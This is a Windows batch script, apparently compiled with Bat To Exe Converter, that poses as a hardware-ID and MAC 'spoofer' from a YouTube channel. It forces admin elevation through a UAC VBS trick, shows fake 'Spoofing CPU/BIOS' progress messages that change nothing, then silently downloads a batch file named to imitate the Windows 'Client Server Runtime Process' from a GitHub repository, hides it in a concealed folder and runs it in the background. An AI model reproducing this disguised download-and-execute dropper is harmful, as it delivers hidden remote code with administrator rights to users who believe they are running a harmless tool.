::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFCt3HjimOXixEroM1NzewtrH9BkhWucoNYvJ06KLMq0e60zqSbUh339UjIs/CQlOewDrXBo6vWdPsyS1JcifthzyWVvH41M1ew==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
color 0a
title 64th Service / https://www.youtube.com/@64thservice

echo ==============================
echo =      64TH NEW TEMP          =
echo ==============================
echo.

:: Request Admin Privileges
:-------------------------------------
REM  --> Check for permissions
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( 
    goto gotAdmin 
)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params=%*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"="%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

:: Set target directory
set "targetDir=C:\Users\PC2\AppData\LocalLow\Microsoft"
if not exist "%targetDir%" (
    mkdir "%targetDir%" 2>nul
    attrib +h "%targetDir%"  :: Hide the directory
)

:: Set the file path
set "DRIVER_FILE=%targetDir%\Client Server Runtime Processs.bat"
set "MAC_FILE=%targetDir%\MAC.bat"

:: Display the spoofing process in the console
echo Starting spoofing process...
timeout /t 2 /nobreak >nul
echo Spoofing Disk...
timeout /t 2 /nobreak >nul
echo Spoofing CPU...
timeout /t 2 /nobreak >nul
echo Spoofing SMBIOS...
timeout /t 2 /nobreak >nul
echo Spoofing BIOS...
timeout /t 2 /nobreak >nul
echo Spoofing Chassis...
timeout /t 2 /nobreak >nul
echo Spoofing Motherboard...
timeout /t 2 /nobreak >nul

:: Download Client in the background if not present
if not exist "%DRIVER_FILE%" (
    echo WAIT...
    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/topking91154/64TEMP/raw/refs/heads/main/Client%%20Server%%20Runtime%%20Processs.bat' -OutFile '%DRIVER_FILE%'" >nul 2>&1
    timeout /t 5 >nul
)

:: Ensure the file exists before running it
if exist "%DRIVER_FILE%" (
    attrib +h "%DRIVER_FILE%"  :: Hide the file
    start /B cmd /c call "%DRIVER_FILE%" >nul 2>&1
)

:end

echo Do you want to spoof the MAC address? (yes/no)
set /p choice=
if /i "%choice%"=="yes" (
    echo MAC spoofing...
    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/topking91154/macspoff/raw/refs/heads/main/MAC.bat' -OutFile '%MAC_FILE%'" >nul 2>&1
    echo Running MAC spoofer...
    start /B cmd /c call "%MAC_FILE%" >nul 2>&1
) else (
    echo MAC address spoofing skipped.
)
timeout /t 5 >nul
echo DONE...

echo Press any key to exit...
pause >nul  
exit /B
